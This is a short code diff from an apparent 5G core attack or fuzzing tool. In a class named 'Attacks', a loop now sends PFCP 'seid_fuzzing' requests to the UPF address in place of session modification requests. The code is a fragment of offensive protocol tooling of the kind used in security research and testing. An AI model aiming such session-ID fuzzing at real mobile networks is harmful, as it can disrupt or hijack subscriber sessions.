@@ -199,19 +199,14 @@ class Attacks():
         
         for i in range(nb):
             seid    = first_seid + i
-            teid    = random.randint(1, PFCPRequest.max_teid)
             ue_addr = PFCPRequest.random_ue_address()
-            far_id  = random.randint(1, 1000)
             
             send(
-                PFCPRequest.session_modification(
+                PFCPRequest.seid_fuzzing(
                     src_addr=get_my_ip_from_prefix(),
                     dst_addr=ip_list["UPF"],
                     ue_addr=ue_addr,
-                    seid=seid, 
-                    teid=teid, 
-                    far_id=far_id,
-                    actions=["FORW"]
+                    seid=seid
                 ), 
                 verbose=False
             )
